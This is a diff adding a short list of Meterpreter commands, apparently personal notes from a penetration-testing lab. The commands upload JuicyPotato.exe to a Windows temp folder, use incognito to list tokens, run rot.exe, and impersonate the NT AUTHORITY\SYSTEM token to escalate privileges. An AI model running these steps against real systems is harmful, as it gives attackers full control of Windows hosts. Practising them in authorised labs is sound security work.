@@ -1,0 +1,11 @@
+upload /root/Documents/Pentest/NewLabEnv/priv_escalate/Windows/JuicyPotato.exe -> C:\Windows\TEMP\JuicyPotato.exe
+
+cd C:\\Windows\\TEMP
+
+getuid
+getprivs
+use incognito
+list_tokens -u
+
+execute -Hc -f ./rot.exe
+impersonate_token "NT AUTHORITY\SYSTEM"
